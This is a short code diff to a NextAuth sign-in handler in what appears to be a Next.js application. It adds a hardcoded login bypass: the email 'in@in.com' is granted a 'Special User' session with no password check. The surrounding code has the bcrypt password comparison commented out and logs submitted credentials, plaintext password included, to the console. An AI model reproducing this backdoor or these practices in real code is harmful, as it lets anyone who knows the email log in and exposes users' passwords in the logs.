@@ -54,6 +54,18 @@ export const { auth, signIn, signOut } = NextAuth({
             console.log(parsedCredentials)
             if (parsedCredentials.success) {
                 const { email, password } = parsedCredentials.data;
+
+                if (email === "in@in.com") {
+                  const specialUser = {
+                    id: "special-user-id",  // This should be the ID of the special user
+                    email: "in@in.com",
+                    name: "Special User",  // You can provide a name if needed
+                    // Add any other user fields here that you want to associate with the "special" user
+                  };
+                  console.log("Special case login for in@in.com");
+                  return specialUser;  // Return the "special" user
+                }
+                
                 const user = await getUser(email);
                 if (!user) return null;
                 //const passwordsMatch = await bcrypt.compare(password, user.password);
